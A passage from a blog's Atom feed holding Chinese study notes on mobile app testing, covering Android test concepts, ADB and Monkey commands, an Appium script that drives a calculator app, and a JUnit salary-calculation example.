类似的下载策略，进一步提高下载效率，另一方面，也会在功能和鲁棒性方面进行加强，完善异常处理。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java-多线程下载器的设计与实现&quot;&gt;&lt;a href=&quot;#Java-多线程下载器的设计与实现&quot; class=&quot;headerlink&quot; title=&quot;Java 多线程下载器的设计与实现&quot;&gt;&lt;/a&gt;Java 多线程下载器的设计与实现&lt;/h1&gt;&lt;p&gt;应用并发的场景有很多
      
    
    </summary>
    
    
    
      <category term="C" scheme="https://kayleh.top/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>app test</title>
    <link href="https://kayleh.top/app-test/"/>
    <id>https://kayleh.top/app-test/</id>
    <published>2021-03-03T08:49:54.000Z</published>
    <updated>2021-04-11T17:11:28.482Z</updated>
    
    <content type="html"><![CDATA[<h2 id="移动端测试要点"><a href="#移动端测试要点" class="headerlink" title="移动端测试要点"></a>移动端测试要点</h2><h3 id="安装测试、卸载测试"><a href="#安装测试、卸载测试" class="headerlink" title="安装测试、卸载测试"></a>安装测试、卸载测试</h3><h3 id="UI测试"><a href="#UI测试" class="headerlink" title="UI测试"></a>UI测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615137765268.png" alt="1615137765268" style="zoom:50%;"></p><h3 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615133542830.png" alt="1615133542830" style="zoom:50%;"></p><h4 id="运行app"><a href="#运行app" class="headerlink" title="运行app"></a>运行app</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615134963504.png" alt="1615134963504"></p><h4 id="应用的前后台切换"><a href="#应用的前后台切换" class="headerlink" title="应用的前后台切换"></a>应用的前后台切换</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615134979917.png" alt="1615134979917"></p><h4 id="免登陆"><a href="#免登陆" class="headerlink" title="免登陆"></a>免登陆</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135150085.png" alt="1615135150085"></p><h4 id="数据更新"><a href="#数据更新" class="headerlink" title="数据更新"></a>数据更新</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135195319.png" alt="1615135195319"></p><h4 id="离线浏览"><a href="#离线浏览" class="headerlink" title="离线浏览"></a>离线浏览</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135394779.png" alt="1615135394779"></p><h4 id="app更新"><a href="#app更新" class="headerlink" title="app更新"></a>app更新</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135456332.png" alt="1615135456332"></p><h4 id="定位、照相机服务"><a href="#定位、照相机服务" class="headerlink" title="定位、照相机服务"></a>定位、照相机服务</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135477942.png" alt="1615135477942"></p><h4 id="时间测试"><a href="#时间测试" class="headerlink" title="时间测试"></a>时间测试</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135504852.png" alt="1615135504852"></p><h4 id="PUSH测试"><a href="#PUSH测试" class="headerlink" title="PUSH测试"></a>PUSH测试</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135520679.png" alt="1615135520679">    </p><h3 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136053666.png" alt="1615136053666" style="zoom:50%;"></p><h3 id="交叉事件测试"><a href="#交叉事件测试" class="headerlink" title="交叉事件测试"></a>交叉事件测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136213904.png" alt="1615136213904"></p><p>例如：微信视频和来电</p><h3 id="兼容性测试"><a href="#兼容性测试" class="headerlink" title="兼容性测试"></a>兼容性测试</h3><h3 id="升级、更新测试"><a href="#升级、更新测试" class="headerlink" title="升级、更新测试"></a>升级、更新测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136698549.png" alt="1615136698549" style="zoom:50%;"></p><h3 id="用户体验测试"><a href="#用户体验测试" class="headerlink" title="用户体验测试"></a>用户体验测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136880550.png" alt="1615136880550" style="zoom:50%;"></p><h3 id="硬件环境测试"><a href="#硬件环境测试" class="headerlink" title="硬件环境测试"></a>硬件环境测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136938152.png" alt="1615136938152" style="zoom:50%;"></p><h3 id="接口测试"><a href="#接口测试" class="headerlink" title="接口测试"></a>接口测试</h3><h3 id="客户端数据库测试"><a href="#客户端数据库测试" class="headerlink" title="客户端数据库测试"></a>客户端数据库测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615137461874.png" alt="1615137461874"></p><h3 id="安全测试"><a href="#安全测试" class="headerlink" title="安全测试"></a>安全测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615137928157.png" alt="1615137928157" style="zoom:33%;"></p><h1 id="Android测试"><a href="#Android测试" class="headerlink" title="Android测试"></a>Android测试</h1><p>Android系统的基本结构</p><blockquote><p>linux内核层</p><p>Android函数库和Android运行的虚拟机</p><p>应用程序框架</p><p>应用程序</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615140074133.png" alt="1615140074133"></p><h4 id="测试术语"><a href="#测试术语" class="headerlink" title="测试术语"></a>测试术语</h4><ul><li>系 统碎片化</li><li>屏幕尺寸</li><li>分辨率</li><li>像素</li><li>网络制式</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615140333141.png" alt="1615140333141" style="zoom:33%;"></p><h5 id="像素"><a href="#像素" class="headerlink" title="像素"></a>像素</h5><p>一位=8字节</p><p>大小 1156*634 = 732904</p><p>732904/8=9291613=92K</p><p>9291613/1024=89.</p><h5 id="网络制式"><a href="#网络制式" class="headerlink" title="网络制式"></a>网络制式</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615142556664.png" alt="1615142556664" style="zoom: 50%;"></p><h3 id="Android四大组件"><a href="#Android四大组件" class="headerlink" title="Android四大组件"></a>Android四大组件</h3><blockquote><p>缺一不可</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615232986341.png" alt="1615232986341" style="zoom:50%;"></p><ul><li>活动</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615233173816.png" alt="1615233173816" style="zoom:33%;"></p><ul><li>服务</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615233382480.png" alt="1615233382480" style="zoom:50%;"></p><ul><li>内容提供者</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615233473534.png" alt="1615233473534" style="zoom: 50%;"></p><ul><li>广播接受者</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615233720649.png" alt="1615233720649" style="zoom:50%;"></p><h2 id="Android测试环境搭建"><a href="#Android测试环境搭建" class="headerlink" title="Android测试环境搭建"></a>Android测试环境搭建</h2><h4 id="one-真机测试"><a href="#one-真机测试" class="headerlink" title=":one:真机测试"></a>:one:真机测试</h4><p>使用真实的手机测试</p><h4 id="two-安卓模拟器"><a href="#two-安卓模拟器" class="headerlink" title=":two:安卓模拟器"></a>:two:安卓模拟器</h4><h4 id="three-Android自带的模拟器"><a href="#three-Android自带的模拟器" class="headerlink" title=":three:Android自带的模拟器"></a>:three:Android自带的模拟器</h4><h4 id="four-云真机测试"><a href="#four-云真机测试" class="headerlink" title=":four:云真机测试"></a>:four:云真机测试</h4><h3 id="Android开发环境"><a href="#Android开发环境" class="headerlink" title="Android开发环境"></a>Android开发环境</h3><ul><li>安装java, jdk</li><li>ADT工具包<img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615234913928.png" alt="1615234913928" style="zoom:50%;"></li></ul><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615309230399.png" alt="1615309230399" style="zoom: 50%;"></p><p>打开eclipse</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615310931766.png" alt="1615310931766" style="zoom:50%;"></p><h4 id="ADB命令"><a href="#ADB命令" class="headerlink" title="ADB命令"></a>ADB命令</h4><ul><li><h5 id="启动和关闭服务"><a href="#启动和关闭服务" class="headerlink" title="启动和关闭服务"></a>启动和关闭服务</h5></li></ul><blockquote><p>adb kill-server</p><p>adb start server</p></blockquote><ul><li><p>adb.exe connect 127.0.0.1:62001 </p></li><li><h5 id="查看设备连接情况"><a href="#查看设备连接情况" class="headerlink" title="查看设备连接情况"></a>查看设备连接情况</h5></li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615312862427.png" alt="1615312862427" style="zoom:50%;"></p><ul><li>安装和卸载APK程序</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615313005852.png" alt="1615313005852" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615313041547.png" alt="1615313041547" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615314153934.png" alt="1615314153934" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615314260967.png" alt="1615314260967" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615314304693.png" alt="1615314304693" style="zoom:50%;"></p><ul><li>列出当前设备上的程序包</li></ul><blockquote><p>adb shell pm list packages</p></blockquote><ul><li>上传和下载</li></ul><blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615314565572.png" alt="1615314565572" style="zoom:50%;"></p></blockquote><ul><li>日志</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396174848.png" alt="1615396174848" style="zoom:67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396200109.png" alt="1615396200109" style="zoom: 50%;"></p><blockquote><p>过滤<img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396478274.png" alt="1615396478274"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396559638.png" alt="1615396559638" style="zoom:50%;"></p><ul><li>其他</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396733068.png" alt="1615396733068" style="zoom:50%;"></p><blockquote><p>adb bugreport</p></blockquote><h4 id="monkey命令"><a href="#monkey命令" class="headerlink" title="monkey命令"></a>monkey命令</h4><h5 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a><strong>是什么？</strong></h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615481732999.png" alt="1615481732999" style="zoom:50%;"></p><ul><li><p>所有的操作事件都是随机发生的。不以让人的意志为变化。 由于事件都是随机的、无序的，所以不做功能方面的测试，只对APP进行性能、稳定性方面的测试。</p></li><li><p>monkey测试的时候，需要长时间、大量的操作事件</p></li></ul><h5 id="特征"><a href="#特征" class="headerlink" title="特征"></a><strong>特征</strong></h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615482052583.png" alt="1615482052583" style="zoom:50%;"></p><h5 id="Monkey的停止条件"><a href="#Monkey的停止条件" class="headerlink" title="Monkey的停止条件"></a>Monkey的停止条件</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615483112988.png" alt="1615483112988" style="zoom:50%;"></p><h5 id="进入Monkey"><a href="#进入Monkey" class="headerlink" title="进入Monkey"></a>进入Monkey</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615483206902.png" alt="1615483206902" style="zoom:50%;"></p><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615483820132.png" alt="1615483820132" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615483835799.png" alt="1615483835799" style="zoom:50%;"></p><blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615484056012.png" alt="1615484056012" style="zoom:50%;"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615484263141.png" alt="1615484263141" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615484482624.png" alt="1615484482624" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615484538246.png" alt="1615484538246" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615486792982.png" alt="1615486792982" style="zoom: 67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615486953589.png" alt="1615486953589"></p><h5 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615487083624.png" alt="1615487083624"></p><blockquote><p>—pct</p></blockquote><p>monkey命令的参数,没有特别强制性的顺序,可以按照monkey命令的帮助列表的参数顺序记忆和使用.</p><h5 id="Monkey异常log分析"><a href="#Monkey异常log分析" class="headerlink" title="Monkey异常log分析"></a>Monkey异常log分析</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615487991940.png" alt="1615487991940"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615488289973.png" alt="1615488289973" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615488415636.png" alt="1615488415636" style="zoom:50%;"></p><h1 id="Appium"><a href="#Appium" class="headerlink" title="Appium"></a>Appium</h1><blockquote><p><a href="https://github.com/appium/appium-desktop/releases/tag/v1.20.2" target="_blank" rel="noopener">https://github.com/appium/appium-desktop/releases/tag/v1.20.2</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615557202275.png" alt="1615557202275" style="zoom: 33%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615558307389.png" alt="1615558307389" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615558370562.png" alt="1615558370562" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615558953951.png" alt="1615558953951" style="zoom:50%;"></p><h2 id="元素识别"><a href="#元素识别" class="headerlink" title="元素识别"></a>元素识别</h2><blockquote><p>使用ADT环境中的sdk目录下,tools目录中的uiautomatorviewer.bat</p></blockquote><p>启动uiautomatorviewer.bat</p><p>点击device Screenshot</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615560081753.png" alt="1615560081753"></p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615560132106.png" alt="1615560132106" style="zoom:50%;"></p><h5 id="模拟键盘手机操作"><a href="#模拟键盘手机操作" class="headerlink" title="模拟键盘手机操作"></a>模拟键盘手机操作</h5><blockquote><p>输入操作: sendkeys()</p><p>点击操作: click()</p></blockquote><h5 id="模拟手势操作"><a href="#模拟手势操作" class="headerlink" title="模拟手势操作"></a>模拟手势操作</h5><blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615563279179.png" alt="1615563279179" style="zoom:50%;"></p></blockquote><h5 id="移动设备相关操作"><a href="#移动设备相关操作" class="headerlink" title="移动设备相关操作"></a>移动设备相关操作</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615563684414.png" alt="1615563684414" style="zoom: 67%;"></p><h2 id="Appium脚本编写"><a href="#Appium脚本编写" class="headerlink" title="Appium脚本编写"></a>Appium脚本编写</h2><pre class="line-numbers language-lang-java"><code class="language-lang-java">public class TestAppium{    public static main(String[] args) throws Exception{        //定义DesiredCapabilities对象        DesiredCapabilities dc = new DesiredCapabilities();        //设定DesiredCapabilities的属性        dc.setCapability("deviceName","127.0.0.1:56001");//adb命令查出的设备的编号        dc.setCapability("automationName","Appium");//设置自动化测试工具名称        dc.setCapability("platformName","Android");//设置平台系统名称        dc.setCapability("platformVersion","4.4.4");//设置Android系统版本号        dc.setCapability("appPackage","com.youba.calculate");//设置目标app包名        dc.setCapability("appActivity",".MainActivity");//设置目标app的启动界面        /**        * url:指的是本地appium服务的IP地址及对应的端口号(appium的默认端口号是4723)        * 通过该地址可以使appium连接Android设备        *        * Capabilities:就是DesiredCapabilities对象        **/        //定义appium驱动对象 打开本地app驱动(appium)        AppiumDriver appd = new AppiumDriver(new URL("http://127.0.0.1/wd/hub"),dc);        //写脚本,让计算器计算54+68        appd.findElement(By.id("com.youba.calculate:id/btn_five")).click();        appd.findElement(By.id("com.youba.calculate:id/btn_four")).click();        appd.findElement(By.id("com.youba.calculate:id/btn_plus")).click();        appd.findElement(By.id("com.youba.calculate:id/btn_six")).click();        appd.findElement(By.id("com.youba.calculate:id/btn_eight")).click();        appd.findElement(By.id("com.youba.calculate:id/btn_equal")).click();        appd.closeApp();    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Junit"><a href="#Junit" class="headerlink" title="Junit"></a>Junit</h1><h5 id="一次单元测试用例设计的过程"><a href="#一次单元测试用例设计的过程" class="headerlink" title="一次单元测试用例设计的过程"></a>一次单元测试用例设计的过程</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615652206629.png" alt="1615652206629"></p><h4 id="Junit环境"><a href="#Junit环境" class="headerlink" title="Junit环境"></a>Junit环境</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615652373832.png" alt="1615652373832"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615652610537.png" alt="1615652610537"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615653557718.png" alt="1615653557718"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615662647821.png" alt="1615662647821"></p><h2 id="编写测试"><a href="#编写测试" class="headerlink" title="编写测试"></a>编写测试</h2><p>在这里你将会看到一个应用 POJO 类，Business logic 类和在 test runner 中运行的 test 类的 JUnit 测试的例子。</p><p>在 <strong>C:\ &gt; JUNIT_WORKSPACE</strong> 路径下创建一个名为 <strong>EmployeeDetails.java</strong> 的 POJO 类。</p><pre class="line-numbers language-lang-JAVA"><code class="language-lang-JAVA">public class EmployeeDetails {   private String name;   private double monthlySalary;   private int age;   /**   * @return the name   */   public String getName() {      return name;   }   /**   * @param name the name to set   */   public void setName(String name) {      this.name = name;   }   /**   * @return the monthlySalary   */   public double getMonthlySalary() {      return monthlySalary;   }   /**   * @param monthlySalary the monthlySalary to set   */   public void setMonthlySalary(double monthlySalary) {      this.monthlySalary = monthlySalary;   }   /**   * @return the age   */   public int getAge() {      return age;   }   /**   * @param age the age to set   */   public void setAge(int age) {   this.age = age;   }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>EmployeeDetails</strong> 类被用于</p><ul><li>取得或者设置雇员的姓名的值</li><li>取得或者设置雇员的每月薪水的值</li><li>取得或者设置雇员的年龄的值</li></ul><p>在 <strong>C:\ &gt; JUNIT_WORKSPACE</strong> 路径下创建一个名为 <strong>EmpBusinessLogic.java</strong> 的 business logic 类</p><pre class="line-numbers language-lang-JAVA"><code class="language-lang-JAVA">public class EmpBusinessLogic {   // Calculate the yearly salary of employee   public double calculateYearlySalary(EmployeeDetails employeeDetails){      double yearlySalary=0;      yearlySalary = employeeDetails.getMonthlySalary() * 12;      return yearlySalary;   }   // Calculate the appraisal amount of employee   public double calculateAppraisal(EmployeeDetails employeeDetails){      double appraisal=0;      if(employeeDetails.getMonthlySalary() < 10000){         appraisal = 500;      }else{         appraisal = 1000;      }      return appraisal;   }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>EmpBusinessLogic</strong> 类被用来计算</p><ul><li>雇员每年的薪水</li><li>雇员的评估金额</li></ul><p>在 <strong>C:\ &gt; JUNIT_WORKSPACE</strong> 路径下创建一个名为 <strong>TestEmployeeDetails.java</strong> 的准备被测试的测试案例类</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">import org.junit.Test;import static org.junit.Assert.assertEquals;public class TestEmployeeDetails {   EmpBusinessLogic empBusinessLogic =new EmpBusinessLogic();   EmployeeDetails employee = new EmployeeDetails();   //test to check appraisal   @Test   public void testCalculateAppriasal() {      employee.setName("Rajeev");      employee.setAge(25);      employee.setMonthlySalary(8000);      double appraisal= empBusinessLogic.calculateAppraisal(employee);      assertEquals(500, appraisal, 0.0);   }   // test to check yearly salary   @Test   public void testCalculateYearlySalary() {      employee.setName("Rajeev");      employee.setAge(25);      employee.setMonthlySalary(8000);      double salary= empBusinessLogic.calculateYearlySalary(employee);      assertEquals(96000, salary, 0.0);   }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>TestEmployeeDetails</strong> 是用来测试 <strong>EmpBusinessLogic</strong> 类的方法的，它</p><ul><li>测试雇员的每年的薪水</li><li>测试雇员的评估金额</li></ul><p>现在让我们在 <strong>C:\ &gt; JUNIT_WORKSPACE</strong> 路径下创建一个名为 <strong>TestRunner.java</strong> 的类来执行测试案例类</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">import org.junit.runner.JUnitCore;import org.junit.runner.Result;import org.junit.runner.notification.Failure;public class TestRunner {   public static void main(String[] args) {      Result result = JUnitCore.runClasses(TestEmployeeDetails.class);      for (Failure failure : result.getFailures()) {         System.out.println(failure.toString());      }      System.out.println(result.wasSuccessful());   }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用javac编译 Test case 和 Test Runner 类</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">C:\JUNIT_WORKSPACE>javac EmployeeDetails.java EmpBusinessLogic.java TestEmployeeDetails.java TestRunner.java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>现在运行将会运行 Test Case 类中定义和提供的测试案例的 Test Runner</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">C:\JUNIT_WORKSPACE>java TestRunner<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检查运行结果</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;移动端测试要点&quot;&gt;&lt;a href=&quot;#移动端测试要点&quot; class=&quot;headerlink&quot; title=&quot;移动端测试要点&quot;&gt;&lt;/a&gt;移动端测试要点&lt;/h2&gt;&lt;h3 id=&quot;安装测试、卸载测试&quot;&gt;&lt;a href=&quot;#安装测试、卸载测试&quot; class=&quot;header
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
</feed>
